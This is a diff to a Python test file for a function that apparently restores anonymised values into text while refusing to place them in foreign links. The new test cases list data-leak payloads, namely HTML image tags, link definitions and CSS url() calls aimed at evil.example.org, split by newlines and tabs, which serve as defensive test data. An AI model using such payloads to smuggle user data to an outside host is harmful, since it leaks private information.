@@ -194,3 +194,26 @@ def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
     assert after.text == "[docs](https://evil.example.org/x_(1)) пишет ivanov@contoso.ru"
     plain = restore(state, "Сайт www.example.org без меток", settings)
     assert (plain.text, plain.segments) == ("Сайт www.example.org без меток", [])
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "<img src=\"https://evil.example.org/p?q=\n<EMAIL_1>\">",
+        "<img src=\"https://host-1.domain-1.example\t@evil.example.org/p?q=<EMAIL_1>\">",
+        "<img src=\"https://host-1.domain-1.example\n@evil.example.org/p?q=<EMAIL_1>\">",
+        "[1]: <https://evil.example.org/p?q=a <EMAIL_1>>",
+        "<div style=\"background:url(https://evil.example.org/p?q=<EMAIL_1>)\">",
+    ],
+)
+def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings, answer):
+    """FINDINGS P1 «Restore: originals still reach foreign links split by whitespace»: браузер выбрасывает
+    из адреса переводы строк и табуляции, атрибут с адресом тянется через строки, цель определения ссылки
+    в угловых скобках — с пробелами, CSS url() в style загружается сам."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+def test_own_link_in_an_attribute_is_still_restored(settings):
+    result = restore(link_state(), '<a href="https://host-1.domain-1.example/?q=<EMAIL_1>">', settings)
+    assert result.text == '<a href="https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru">'
